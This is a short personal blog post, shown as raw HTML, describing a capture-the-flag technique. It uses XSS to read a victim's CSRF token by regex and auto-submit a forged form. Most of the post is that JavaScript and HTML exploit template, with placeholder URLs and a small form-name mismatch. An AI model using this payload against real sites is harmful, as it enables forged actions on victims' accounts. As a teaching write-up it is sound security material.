<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CSRF Token Extraction - AJDIN</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:title" content="CSRF Token Extraction" />
<meta property="og:description" content="Extracting tokens from victim using XSS for fun." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ajdin.io/posts/csrf-bypass-token-with-xss/" />
<meta property="article:published_time" content="2020-05-07T00:43:19+02:00" />
<meta property="article:modified_time" content="2020-05-07T00:43:19+02:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CSRF Token Extraction"/>
<meta name="twitter:description" content="Extracting tokens from victim using XSS for fun."/>
<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">

	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" />
	<link rel="stylesheet" type="text/css" href="https://ajdin.io/css/custom.css" />
	<link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
	<link rel="stylesheet" type="text/css" href="https://ajdin.io/css/custom-dark.css"  />

	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<script src="https://ajdin.io/js/main.js"></script>
	<script src="https://ajdin.io/js/abc.js"></script>
	<script src="https://ajdin.io/js/xyz.js"></script>
	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
</head>

<body>
	<div class="container wrapper post">
		<div class="header">
	<base href="https://ajdin.io/">
	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
		</nav>
	</div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">Home</a>
			</li>
			
			<li>
				<a href="/posts">Archive</a>
			</li>
			
			<li>
				<a href="/about">About</a>
			</li>
			
			<li>
				<a href="/categories">Categories</a>
			</li>
			
			<li>
				<a href="/tags">Tags</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post-header">
			<h1 class="title">CSRF Token Extraction</h1>
			<div class="meta">Posted at &mdash; May 7, 2020</div>
		</div>

		<div class="markdown">
            
<p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;url goes here&gt;&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span><span style="color:#f92672">&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> ... <span style="color:#f92672">/&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">/&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Submit</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/button&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/form&gt;</span>

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
                <span style="color:#a6e22e">xhttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
                <span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#66d9ef">false</span>);
                <span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">send</span>();

                <span style="color:#a6e22e">token_admin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">xhttp</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/[abcdef0123456789]{32}/</span>));

                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;token&#39;</span>).<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;value&#39;</span>, <span style="color:#a6e22e">token_admin</span>)

                document.<span style="color:#a6e22e">csrf_form</span>.<span style="color:#a6e22e">submit</span>();
<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</code></pre></div><p>What is this token? Well one way to protect your site from CSRF attacks it to use tokens to validate if the request is being authentic, so we have to switch our token with victims token.</p>
<p>The code is pretty easy to understand. This code inside the <code>&lt;script&gt;</code> tag is executed on our victims machine, and it loads a new <code>HTTP</code> request, finds the token using regular expressions and replaces it. Now our form has a valid token and we can submit it.</p>


		</div>

		<div class="post-tags">
			
				
					<nav class="nav tags">
							<ul class="flat">
								
								<li><a href="/tags/csrf">CSRF</a></li>
								
								<li><a href="/tags/xss">XSS</a></li>
								
							</ul>
					</nav>
				
			
		</div>
		</div>
	<div class="footer wrapper">
	<nav class="nav">
		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
	</nav>
</div>



<script>feather.replace()</script>
</body>
</html>
